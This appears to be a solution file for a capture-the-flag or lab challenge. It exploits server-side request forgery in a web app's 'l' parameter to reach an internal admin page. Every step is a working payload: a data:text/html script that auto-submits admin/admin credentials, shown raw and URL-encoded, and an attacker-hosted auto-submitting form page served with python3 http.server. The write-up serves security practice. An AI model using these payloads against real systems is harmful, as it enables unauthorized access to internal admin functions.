@@ -1,0 +1,35 @@
+Accessing Internal Pages:
+    - http://172.17.0.2:5000/?l=http:%2f%2flocalhost:5000%2fadmin
+
+Javascript Execution:
+ - This solution uses the "data:text/html " convention for calling JS.  To use it in a URL, make sure to encode it properly.
+    data:text/html, <script>document.write('<form id=form method=post action="http://localhost:5000/admin"><input type=hidden value=admin name=username><input type=hidden name=password value=admin></form>');document.getElementById('form').submit();</script>
+
+  - Encoded, it looks like the following:
+    http://172.17.0.2:5000/?l=data:text%2Fhtml%2C%20%3Cscript%3Edocument.write(%27%3Cform%20id%3Dform%20method%3Dpost%20action%3D%22http%3A%2F%2Flocalhost%3a5000%2Fadmin%22%3E%3Cinput%20type%3Dhidden%20value%3Dadmin%20name%3Dusername%3E%3Cinput%20type%3Dhidden%20name%3Dpassword%20value%3Dadmin%3E%3C%2Fform%3E%27)%3Bdocument.getElementById(%27form%27).submit()%3B%3C%2Fscript%3E
+
+
+
+Easy POST Solution with external host:
+ - Generate page to submit form to internal page:
+    <!doctype html>
+    <html>
+        <body>
+            <form id=form method=post action=http://172.17.0.2:5000/admin>
+                <input value=admin name=username type=hidden>
+                <input value=admin name=password type=hidden>
+            </form>
+            <script>
+                document.getElementById('form').submit();
+            </script>
+        </body>
+    </html>
+
+ - Host malicious page on server:
+    python3 -m http.server 8888
+
+ - Request page 
+    http://172.17.0.2:5000/?l=http:%2f%2f192.168.1.26:8888
+
+
+
